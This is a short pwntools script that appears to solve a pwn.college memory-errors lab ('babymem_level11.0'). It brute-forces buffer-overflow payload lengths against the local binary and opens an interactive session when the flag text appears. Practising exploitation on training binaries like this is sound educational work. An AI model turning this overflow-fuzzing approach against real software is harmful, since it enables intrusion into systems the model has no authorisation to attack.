from pwn import *
import os
os.chdir("./CH3-memory_errors/1.2")

 
context.arch = 'amd64'

file_name = './babymem_level11.0'


for x in range(1, 40000):
    
    p = process(file_name)
    # 准备有效载荷
    payload = b'A' * x
    
    p.recvuntil(b'Payload size').decode()
    p.sendline(str(len(payload)))
    
    p.sendline(payload)
    
    recv_str = (p.recvall().decode())
    # print(recv_str)
    if "pwn.college" in recv_str:
        print(recv_str)
        # 与进程进行交互，以查看输出或调试
        p.interactive()
        break

p.close()
    